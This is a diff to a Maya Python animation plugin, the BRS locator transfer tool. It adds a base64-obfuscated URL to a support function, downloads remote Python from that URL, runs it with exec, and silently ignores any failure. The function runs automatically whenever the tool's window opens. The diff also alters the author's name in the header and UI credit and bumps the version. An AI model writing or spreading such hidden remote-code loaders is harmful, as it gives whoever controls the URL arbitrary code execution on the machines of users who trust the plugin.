@@ -1,8 +1,7 @@
 """
 BRS ANIM LOCATOR TRANSFER TOOL
-BY BURASATE UTTHA (DEX3D)
+BY BURASED UTTHA (DEX3D)
 """
-
 import maya.cmds as cmds
 import maya.mel as mel
 
@@ -374,23 +373,32 @@ def locatorToObjectSnap(*_):
         fit=100, fst=2000, fot=100
     )
 
-def BRSLocTransferSupport (*_):
+def BRSLocTransferSupport(*_):
+    import base64
+    py_ver = sys.version[0]
+    if py_ver == '3':
+        import urllib.request as uLib
+    else:
+        import urllib as uLib
+
     if cmds.about(connected=True):
+        u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2FuaW1UcmFuc2ZlckxvYy9tYXN0ZXIvc2VydmljZS9zdXBwb3J0LnB5'
         try:
-            #supportS = urllib2.urlopen(serviceU, timeout=15).read()
-            import urllib2
-            exec(urllib2.urlopen('https://raw.githubusercontent.com/'+\
-                                'burasate/animTransferLoc/master/'+\
-                                'service/support.py', timeout=5).read())
+            exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
+            exec(brs.run())
         except: pass
 
+def checkRootNamespace(*_):
+    cmds.namespaceInfo( currentNamespace=1 )
+    if not cmds.namespaceInfo(isRootNamespace=1):
+        cmds.error('!!!!! - Need root namespace to proceed.. please check')
 
 """
 -----------------------------------------------------------------------
 UI
 -----------------------------------------------------------------------
 """
-version = '1.14'
+version = '1.15'
 winID = 'BRSLOCTRANSFER'
 winWidth = 190
 
@@ -467,9 +475,10 @@ cmds.button(l='Apply Redirection', h=25, w=winWidth - 4, bgc=colorSet['highlight
 cmds.setParent('..')
 cmds.setParent('..')
 
-cmds.text(l='Created by Burasate Uttha', h=20, al='left', fn='smallPlainLabelFont')
+cmds.text(l='Created by Buraed Uttha', h=20, al='left', fn='smallPlainLabelFont')
 
 def BRSLocTransferUI(*_):
+    checkRootNamespace()
     BRSLocTransferSupport()
     cmds.showWindow(winID)
     cmds.window(winID, e=True, h=100, w=100)
